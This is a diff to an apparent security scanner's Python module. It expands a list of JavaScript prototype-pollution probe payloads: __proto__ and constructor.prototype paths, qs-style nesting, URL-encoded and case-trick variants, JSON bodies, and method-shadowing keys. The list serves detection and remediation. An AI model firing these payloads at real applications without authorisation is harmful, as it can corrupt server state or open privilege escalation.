@@ -18,9 +18,45 @@ from sentinelx.core.models import Finding, Evidence, raw_request, raw_response
 MARKER = "sxPolluted"
 
 POLLUTION_PAYLOADS = [
+    # --- TECHNIQUE: direct __proto__ assignment ---
     ("__proto__[sxPolluted]", "polluted1"),
     ("__proto__.sxPolluted", "polluted2"),
+    # --- TECHNIQUE: constructor.prototype path ---
     ("constructor[prototype][sxPolluted]", "polluted3"),
+    ("constructor.prototype.sxPolluted", "polluted4"),
+    # --- TECHNIQUE: nested object paths ---
+    ("a[__proto__][sxPolluted]", "polluted5"),
+    ("a.b.__proto__.sxPolluted", "polluted6"),
+    # --- TECHNIQUE: JSON body variants (also tested as query keys) ---
+    ("__proto__", '{"sxPolluted":"polluted7"}'),
+    ("constructor", '{"prototype":{"sxPolluted":"polluted8"}}'),
+    # --- TECHNIQUE: array index pollution ---
+    ("__proto__[0]", "polluted9"),
+    ("items[__proto__][sxPolluted]", "polluted10"),
+    # --- TECHNIQUE: defineGetter/defineProperty ---
+    ("__proto__[__defineGetter__]", "polluted11"),
+    # --- TECHNIQUE: deep merge vectors (lodash-style) ---
+    ("a.b.c.__proto__.sxPolluted", "polluted12"),
+    ("__proto__[toString]", "polluted13"),
+    # --- TECHNIQUE: query-string nesting (qs library) ---
+    ("a[__proto__][sxPolluted]", "polluted14"),
+    ("data[__proto__][sxPolluted]", "polluted15"),
+    # --- TECHNIQUE: prototype of arrays ---
+    ("[].__proto__.sxPolluted", "polluted16"),
+    # --- TECHNIQUE: valueOf/hasOwnProperty shadowing ---
+    ("__proto__[valueOf]", "polluted17"),
+    ("__proto__[hasOwnProperty]", "polluted18"),
+    # --- TECHNIQUE: URL-encoded variants ---
+    ("%5f%5fproto%5f%5f%5bsxPolluted%5d", "polluted19"),
+    ("__proto__%5bsxPolluted%5d", "polluted20"),
+    # --- TECHNIQUE: case/whitespace tricks ---
+    ("__PROTO__[sxPolluted]", "polluted21"),
+    (" __proto__[sxPolluted]", "polluted22"),
+    # --- TECHNIQUE: multi-key JSON ---
+    ("data", '{"a":"x","__proto__":{"sxPolluted":"polluted23"}}'),
+    # --- TECHNIQUE: merge-target confusion ---
+    ("options[__proto__][sxPolluted]", "polluted24"),
+    ("settings[constructor][prototype][sxPolluted]", "polluted25"),
 ]
 
 REMEDIATION_PROTO = (
